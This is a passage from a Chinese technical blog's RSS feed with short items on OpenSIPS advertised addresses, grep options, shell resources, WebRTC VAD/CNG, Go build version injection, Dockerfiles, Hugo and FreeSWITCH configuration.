&lt;p&gt;我们模拟一下，假如设置了错误的Via的地址会怎样呢？&lt;/p&gt;
&lt;p&gt;例如从公网到内网的一个INVITE,  如果Via头加上的是OUTER_IP， 那么这个请求的响应也会被送到OPS的公网地址。但是由于网络策略和防火墙等原因，这个来自内网的响应很可能无法被送到OPS的公网地址。&lt;/p&gt;
&lt;p&gt;一般情况下，我们可以使用listen的as参数来设置对外的广告地址。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;listen = udp:192.168.2.11:5060 as 1.2.3.4:5060
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样的情况下，从内网发送到公网请求，携带的Via就被被设置成1.2.3.4。&lt;/p&gt;
&lt;p&gt;但是也不是as设置的广告地址一定正确。这时候我们就可以用OpenSIPS提供的核心函数set_advertised_address或者set_advertised_port()来在脚本里自定义对外地址。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (请求来自外网) {
    set_advertised_address(&amp;#34;192.168.2.11&amp;#34;);
} else {
    set_advertised_address(&amp;#34;1.2.3.4&amp;#34;);
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>grep常用参考</title>
      <link>https://wdd.js.org/shell/grep-docs/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/shell/grep-docs/</guid>
      <description>&lt;h1 id=&#34;1-grep-常用参数&#34;&gt;1. grep 常用参数&lt;/h1&gt;
&lt;p&gt;参考： GNU Grep 3.0&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;--color:高亮显示匹配到的字符串
-v：显示不能被pattern匹配到的
-i：忽略字符大小写
-o：仅显示匹配到的字符串
-q：静默模式，不输出任何信息
-A#：after，匹配到的后#行
-B#：before，匹配到的前#行
-C#：context，匹配到的前后各#行
-E：使用ERE，支持使用扩展的正则表达式
－c：只输出匹配行的计数。
－I：不区分大 小写(只适用于单字符)。
－h：查询多文件时不显示文件名。
－l：查询多文件时只输出包含匹配字符的文件名。
－n：显示匹配行及 行号。
- m: 匹配多少个关键词之后就停止搜索
－s：不显示不存在或无匹配文本的错误信息。
－v：显示不包含匹配文本的所有行。
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-普通搜索tracelog-中含有error字段的日志&#34;&gt;2. 普通：搜索trace.log 中含有ERROR字段的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep ERROR trace.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-输出文件可以将日志输出文件中&#34;&gt;3. 输出文件：可以将日志输出文件中&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep ERROR trace.log &amp;gt; error.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-反向搜索不包含error字段的日志&#34;&gt;4. 反向：搜索不包含ERROR字段的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -v ERROR trace.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-向前搜索包含error并且显示error前10行的日志&#34;&gt;5. 向前：搜索包含ERROR,并且显示ERROR前10行的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -B 10 ERROR trace.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;6-向后搜索包含error字段并且显示error后10行的日志&#34;&gt;6. 向后：搜索包含ERROR字段，并且显示ERROR后10行的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -A 10 ERROR trace.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;7-上下文搜索包含error字段并且显示error字段前后10行的日志&#34;&gt;7. 上下文：搜索包含ERROR字段，并且显示ERROR字段前后10行的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -C 10 ERROR trace.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;8-多字段搜索包含error和debug字段的日志&#34;&gt;8. 多字段：搜索包含ERROR和DEBUG字段的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gerp -E &amp;#39;ERROR|DEBUG&amp;#39; trace.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;9-多文件从多个log文件中搜索含有error的日志&#34;&gt;9. 多文件：从多个.log文件中搜索含有ERROR的日志&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep ERROR *.log
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;10-省略文件名从多个log文件中搜索error字段日志并不显示日志文件名&#34;&gt;10. 省略文件名：从多个.log文件中搜索ERROR字段日志，并不显示日志文件名&lt;/h1&gt;
&lt;p&gt;从多个文件中搜索的日志默认每行会带有日志文件名&lt;/p&gt;</description>
    </item>
    <item>
      <title>Shell 书籍和资料收藏</title>
      <link>https://wdd.js.org/shell/star-collect/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/shell/star-collect/</guid>
      <description>&lt;h1 id=&#34;shell-自动化测试&#34;&gt;shell 自动化测试&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/bats-core/bats-core&#34;&gt;https://github.com/bats-core/bats-core&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;shell精进&#34;&gt;shell精进&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/NARKOZ/hacker-scripts&#34;&gt;https://github.com/NARKOZ/hacker-scripts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/trimstray/the-book-of-secret-knowledge&#34;&gt;https://github.com/trimstray/the-book-of-secret-knowledge&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing&#34;&gt;https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dylanaraps/pure-bash-bible&#34;&gt;https://github.com/dylanaraps/pure-bash-bible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dylanaraps/pure-sh-bible&#34;&gt;https://github.com/dylanaraps/pure-sh-bible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Idnan/bash-guide&#34;&gt;https://github.com/Idnan/bash-guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/denysdovhan/bash-handbook&#34;&gt;https://github.com/denysdovhan/bash-handbook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html&#34;&gt;https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/jlevy/the-art-of-command-line&#34;&gt;https://github.com/jlevy/the-art-of-command-line&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://google.github.io/styleguide/shell.xml&#34;&gt;https://google.github.io/styleguide/shell.xml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.bash-hackers.org/start&#34;&gt;https://wiki.bash-hackers.org/start&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://linuxguideandhints.com/&#34;&gt;https://linuxguideandhints.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;安全加固&#34;&gt;安全加固&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.lisenet.com/2017/centos-7-server-hardening-guide/&#34;&gt;https://www.lisenet.com/2017/centos-7-server-hardening-guide/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://highon.coffee/blog/security-harden-centos-7/&#34;&gt;https://highon.coffee/blog/security-harden-centos-7/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/trimstray/the-practical-linux-hardening-guide&#34;&gt;https://github.com/trimstray/the-practical-linux-hardening-guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/decalage2/awesome-security-hardening&#34;&gt;https://github.com/decalage2/awesome-security-hardening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/&#34;&gt;https://www.hackingarticles.in/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/toniblyx/my-arsenal-of-aws-security-tools&#34;&gt;https://github.com/toniblyx/my-arsenal-of-aws-security-tools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>WebRTC 人声检测与舒适噪音</title>
      <link>https://wdd.js.org/freeswitch/webrtc-vad-cng/</link>
      <pubDate>Wed, 01 Jun 2022 08:27:53 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/webrtc-vad-cng/</guid>
      <description>&lt;h1 id=&#34;人声检测-vad&#34;&gt;人声检测 VAD&lt;/h1&gt;
&lt;p&gt;人声检测(VAD: Voice Activity Detection)是区分语音中是人说话的声音，还是其他例如环境音的一种功能。&lt;/p&gt;
&lt;p&gt;除此以外，人声检测还能用于减少网络中语音包传输的数据量，从而极大的降低语音的带宽，极限情况下能降低50%的带宽。&lt;/p&gt;
&lt;p&gt;在一个通话中，一般都是只有一个人说话，另一人听。很少可能是两个人都说话的。&lt;/p&gt;
&lt;p&gt;例如A在说话的时候，B可能在等待。&lt;/p&gt;
&lt;p&gt;虽然B在等待过程中，B的语音流依然再按照原始速度和编码再发给A, 即使这里面是环境噪音或者是无声。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-log&#34; data-lang=&#34;log&#34;&gt;A ----&amp;gt; B # A在说话
A &amp;lt;---  B # B在等待过程中，B的语音流依然再按照原始速度和编码再发给A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果B具有VAD检测功能，那么B就可以在不说话的时候，发送特殊标记的语音流或者通过减少语音流发送的频率，来减少无意义语音的发送。&lt;/p&gt;
&lt;p&gt;从而极大的降低B-&amp;gt;A的语音流。&lt;/p&gt;
&lt;p&gt;下图是Wireshark抓包的两种RTP包，g711编码的占214字节，但是用舒适噪音编码的只有63字节。将近减少了4倍的带宽。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/images/Xnip2022-06-01_14-08-05.jpg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;舒适噪音生成器-cng&#34;&gt;舒适噪音生成器 CNG&lt;/h1&gt;
&lt;p&gt;舒适噪音(CN stands for Comfort Noise), 是一种模拟的背景环境音。舒适噪音生成器在接收端根据发送到给的参数，来产生类似接收端的舒适噪音, 用来模拟发送方的噪音环境。&lt;/p&gt;
&lt;p&gt;CN也是一种RTP包的格式，定义在&lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc3389&#34;&gt;RFC 3389&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;舒适噪音的payload, 也被称作静音插入描述帧(SID: a Silence Insertion Descriptor frame), 包括一个字节的数据，用来描述噪音的级别。也可以包含其他的额外的数据。早期版本的舒适噪音的格式定义在RFC 1890中，这个版本的格式只包含一个字段，就是噪音级别。&lt;/p&gt;
&lt;p&gt;噪音级别占用一个字节，其中第一个bit必须是0， 因此噪音级别有127中可能。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; 0 1 2 3 4 5 6 7
+-+-+-+-+-+-+-+-+
|0|   level     |
+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;跟着噪音级别的后续字节都是声音的频谱信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Byte        1      2    3    ...   M+1
       +-----+-----+-----+-----+-----+
       |level|  N1 |  N2 | ... |  NM |
       +-----+-----+-----+-----+-----+

Figure 2: CN Payload Packing Format
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在SIP INVITE的SDP中也可以看到编码，如下面的CN&lt;/p&gt;</description>
    </item>
    <item>
      <title>在二进制文件中注入版本信息</title>
      <link>https://wdd.js.org/golang/inject-version/</link>
      <pubDate>Sat, 28 May 2022 21:47:41 +0800</pubDate>
      <guid>https://wdd.js.org/golang/inject-version/</guid>
      <description>&lt;p&gt;暴露的变量必须用var定义，不能用const定义&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-golang&#34; data-lang=&#34;golang&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// main.go&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;VERSION&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unknow&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SHA&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unknow&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BUILD_TIME&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unknow&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cli&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;App&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;VERSION&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\r\nsha: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SHA&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\r\nbuild time: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BUILD_TIME&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Makefile&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tag?=v0.0.5
DATE?=$(shell date +%FT%T%z)
VERSION_HASH =  $(shell git rev-parse HEAD)
LDFLAGS=&amp;#39;-X &amp;#34;main.VERSION=$(tag)&amp;#34; -X &amp;#34;main.SHA=$(VERSION_HASH)&amp;#34; -X &amp;#34;main.BUILD_TIME=$(DATE)&amp;#34;&amp;#39;

build:
   CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags $(LDFLAGS) -o wellcli main.go
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行make build, 产生的二进制文件，就含有注入的信息了。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-ldflags &amp;#39;[pattern=]arg list&amp;#39; 	arguments to pass on each go tool link invocation.
https://golang.google.cn/cmd/go/#hdr-Build_modes
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.digitalocean.com/community/tutorials/using-ldflags-to-set-version-information-for-go-applications&#34;&gt;https://www.digitalocean.com/community/tutorials/using-ldflags-to-set-version-information-for-go-applications&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Golang Dockerfile</title>
      <link>https://wdd.js.org/golang/scratch-dockerfile/</link>
      <pubDate>Sat, 28 May 2022 21:45:48 +0800</pubDate>
      <guid>https://wdd.js.org/golang/scratch-dockerfile/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FROM golang:1.16.2 as builder
ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build .

FROM scratch
WORKDIR /app
COPY --from=builder /app/your_app .
# 配置时区
COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo
ENV TZ=Asia/Shanghai
EXPOSE 8080
ENTRYPOINT [&amp;#34;./your_app&amp;#34;]
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Hugo博客常见问题以及解决方案</title>
      <link>https://wdd.js.org/posts/2022/05/hugo-blog-faq/</link>
      <pubDate>Sat, 28 May 2022 21:08:43 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2022/05/hugo-blog-faq/</guid>
      <description>&lt;h1 id=&#34;如何在markdown中插入图片&#34;&gt;如何在markdown中插入图片&lt;/h1&gt;
&lt;p&gt;在static 目录中创建 images 目录，然后把图片放到images目录中。&lt;/p&gt;
&lt;p&gt;在文章中引用的时候&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;![](/images/qianxun.jpeg#center)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/images/qianxun.jpeg#center&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;notice warning&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-exclamation-triangle&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Warning
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;&lt;p&gt;我之前创建的文件夹的名字叫做 img, 本地可以正常显示，但是部署之后，就无法显示图片了。&lt;/p&gt;
&lt;p&gt;最后我把img改成images才能正常在网页上显示。&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;</description>
    </item>
    <item>
      <title>安装bcg729模块</title>
      <link>https://wdd.js.org/freeswitch/install-bcg729/</link>
      <pubDate>Sat, 28 May 2022 17:34:13 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/install-bcg729/</guid>
      <description>&lt;p&gt;g729编码的占用带宽是g711的1/8，使用g729编码，可以极大的降低带宽的费用。fs原生的mod_g927模块是需要按并发数收费的，但是我们可以使用开源的bcg729模块。&lt;/p&gt;
&lt;p&gt;这里需要准备两个仓库，为了加快clone速度，我将这两个模块导入到gitee上。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://gitee.com/wangduanduan/mod_bcg729&#34;&gt;https://gitee.com/wangduanduan/mod_bcg729&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gitee.com/wangduanduan/bcg729&#34;&gt;https://gitee.com/wangduanduan/bcg729&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;安装前提
已经安装好了freeswitch, 编译mod_bcg729模块，需要指定freeswitch头文件的位置&lt;/p&gt;
&lt;h1 id=&#34;step0-切换到工作目录&#34;&gt;step0: 切换到工作目录&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /usr/local/src/
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;step1-clone-mod_bcg729&#34;&gt;step1: clone mod_bcg729&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://gitee.com/wangduanduan/mod_bcg729.git
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;step2-clone-bcg729&#34;&gt;step2: clone bcg729&lt;/h1&gt;
&lt;p&gt;mod_bcg729模块在编辑的时候，会检查当前目录下有没有bcg729的目录。
如果没有这个目录，就会从github上clone bcg729的项目。
所以我们可以在编译之前，先把bcg729 clone到mob_bcg729目录下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd mod_bcg729
git clone https://gitee.com/wangduanduan/bcg729.git
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;step3-编辑mod_bcg729&#34;&gt;step3: 编辑mod_bcg729&lt;/h1&gt;
&lt;p&gt;编译mod_bcg729需要指定fs头文件switch.h的位置。
在Makefile项目里有FS_INCLUDES这个变量用来定义fs头文件的位置&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FS_INCLUDES=/usr/include/freeswitch
FS_MODULES=/usr/lib/freeswitch/mod
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果你的源码头文件路径不是/usr/include/freeswitch， 则需要在执行make命令时通过参数指定， 例如下面编译的时候。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;make FS_INCLUDES=/usr/local/freeswitch/include/freeswitch
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;notice tip&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-lightbulb-o&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Tip
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;如何找到头文件的目录？
头文件一般在fs安装目录的include/freeswitch目录下
如果还是找不到，则可以使用 find /usr -name switch.h -type f  搜索对应的头文件&lt;/div&gt;
&lt;/div&gt;
&lt;h1 id=&#34;step4-复制so文件&#34;&gt;step4: 复制so文件&lt;/h1&gt;
&lt;p&gt;mod_bcg729编译之后，可以把生成的mod_bcg729.so拷贝到fs安装目录的mod目录下&lt;/p&gt;
&lt;h1 id=&#34;step5-加载模块&#34;&gt;step5: 加载模块&lt;/h1&gt;
&lt;p&gt;命令行加载&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;load mod_bcg729
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置文件加载
命令行加载重启后就失效了，可以将加载的模块写入到配置文件中。
在modules.conf.xml中加入&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;load module=&amp;#34;mod_bcg729&amp;#34;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;step5-varsxml修改&#34;&gt;step5: vars.xml修改&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; &amp;lt;X-PRE-PROCESS cmd=&amp;#34;set&amp;#34; data=&amp;#34;global_codec_prefs=PCMU,PCMA,G729&amp;#34; /&amp;gt;
 &amp;lt;X-PRE-PROCESS cmd=&amp;#34;set&amp;#34; data=&amp;#34;outbound_codec_prefs=PCMU,PCMA,G729&amp;#34;/&amp;gt;
 &amp;lt;X-PRE-PROCESScmd=&amp;#34;set&amp;#34;data=&amp;#34;media_mix_inbound_outbound_codecs=true&amp;#34;/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;step6-sip-profile修改&#34;&gt;step6: sip profile修改&lt;/h1&gt;
&lt;p&gt;开启转码&lt;/p&gt;</description>
    </item>
    <item>
      <title>会议提示音无法正常播放</title>
      <link>https://wdd.js.org/freeswitch/conference-announce/</link>
      <pubDate>Sat, 28 May 2022 17:17:54 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/conference-announce/</guid>
      <description>&lt;p&gt;呼入到会议，正常来说，当会议室有且只有一人时，应该会报“当前只有一人的提示音”。但是测试的时候，输入了密码，进入了会议，却没有播报正常的提示音。&lt;/p&gt;
&lt;p&gt;经过排查发现，dialplan中，会议室的名字中含有@符号。&lt;/p&gt;
&lt;p&gt;按照fs的文档，发现@后面应该是profilename, 然而fs的conference.conf.xml却没有这个profile, 进而导致语音无法播报的问题。所以只要加入这个profile, 或者直接用@default, 就可以正确的播报语音了。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Action data&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;confname&lt;/td&gt;
          &lt;td&gt;profile is &amp;ldquo;default&amp;rdquo;, no flags or pin&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;confname+1234&lt;/td&gt;
          &lt;td&gt;profile is &amp;ldquo;default&amp;rdquo;, pin is 1234&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;confname@profilename+1234&lt;/td&gt;
          &lt;td&gt;profile is &amp;ldquo;profilename&amp;rdquo;, pin=1234, no flags&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;confname+1234+flags{mute}&lt;/td&gt;
          &lt;td&gt;profile is &amp;ldquo;default&amp;rdquo;, pin=1234, one flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;confname++flags{endconf|moderator}&lt;/td&gt;
          &lt;td&gt;profile is &amp;ldquo;default&amp;rdquo;, no p.i.n., multiple flags&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;bridge:confname:1000@${domain_name}&lt;/td&gt;
          &lt;td&gt;a &amp;ldquo;bridging&amp;rdquo; conference, you must provide another endpoint, or &amp;rsquo;none&#39;.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;bridge:&lt;em&gt;uuid&lt;/em&gt;:none&lt;/td&gt;
          &lt;td&gt;a &amp;ldquo;bridging&amp;rdquo; conference with UUID assigned as conference name&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;所以，当你遇到问题的时候，应该仔细的再去阅读一下官方的接口文档。&lt;/p&gt;
&lt;p&gt;参考文档&lt;/p&gt;</description>
    </item>
    <item>
      <title>FS日志设置</title>
      <link>https://wdd.js.org/freeswitch/log-settings/</link>
      <pubDate>Sat, 28 May 2022 17:14:05 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/log-settings/</guid>
      <description>&lt;h1 id=&#34;开启sip信令的日志&#34;&gt;开启sip信令的日志&lt;/h1&gt;
&lt;p&gt;这样会让fs把收发的sip信令打印到fs_cli里面，但不是日志文件里面&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sofia global siptrace on

# sofia global siptrace off 关闭
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;开启sofia模块的日志&#34;&gt;开启sofia模块的日志&lt;/h1&gt;
&lt;p&gt;sofia 模块的日志即使开启，也是输出到fs_cli里面的，不会输出到日志文件里面&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sofia loglevel all 7
# sofia loglevel &amp;lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun&amp;gt; [0-9]
